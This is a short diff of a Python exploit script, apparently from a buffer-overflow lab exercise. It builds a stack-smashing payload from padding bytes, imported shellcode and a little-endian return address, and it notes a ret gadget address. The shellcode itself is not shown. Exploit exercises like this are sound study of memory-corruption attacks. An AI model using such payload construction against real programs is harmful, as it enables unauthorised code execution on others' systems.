@@ -3,8 +3,9 @@
 import sys
 
 from shellcode import shellcode
+sys.stdout.buffer.write(shellcode)
 
-sys.stdout.buffer.write(b'L'*112+shellcode)
+#sys.stdout.buffer.write(b'A'*50+shellcode+0x0000000000401e6c.to_bytes(8,"little"))
 
 # ret: 0x0000000000401e0f
 
